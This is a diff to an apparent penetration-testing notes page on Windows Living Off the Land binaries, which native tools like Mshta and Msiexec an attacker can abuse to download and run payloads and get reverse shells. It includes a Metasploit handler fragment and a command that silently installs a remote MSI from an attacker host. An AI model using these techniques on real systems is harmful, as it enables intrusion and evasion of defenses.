@@ -1,8 +1,20 @@
-# 🔧 LOL Binaries
+# LOL Binaries
 
+## General Concept
 
+Living Off the Land (LOL) binaries are the native Microsoft binary applications that are preinstalled on windows systems and are almost always available for us to use. these can be as simple as the echo command or be used for more advanced stuff like downloading and executing files, converting exe to cert or other interesting  things that an attacker can leverage to bypass defense mechanisms.
 
-## Tools
+Generally speaking, when we want a bin/reverse shell we go looking for the specific binaries that can download and execute our payloads. [LOLBAS ](https://lolbas-project.github.io)is a great collection of all known LOL binaries and we can search the collection for binaries with specific capabilities that we want by using a slash '/' and the name of the capability in the search bar for example /execute will show us all binaries that can execute code or scripts.
+
+### For Download
+
+{% embed url="https://lolbas-project.github.io/#/download" %}
+
+### For Execute
+
+{% embed url="https://lolbas-project.github.io/#/execute" %}
+
+## Example Tools
 
 **Mshta.exe :** Launch HTA attack via HTA Web Server of Metasploit
 
@@ -18,12 +30,6 @@
 * Launch Batch File Attack via Powershell
 
 **Msiexec.exe :** Launch msiexec attack via msfvenom
-
-**Wmic.exe :** Launch Wmic.exe attack via Koadic
-
-find more at : &#x20;
-
-{% embed url="https://lolbas-project.github.io" %}
 
 ## Mshta.exe
 
@@ -186,6 +192,3 @@ msf exploit(multi/handler) > exploit
 ```
 msiexec /q /i http://192.168.1.109/1.msi
 ```
-
-
-
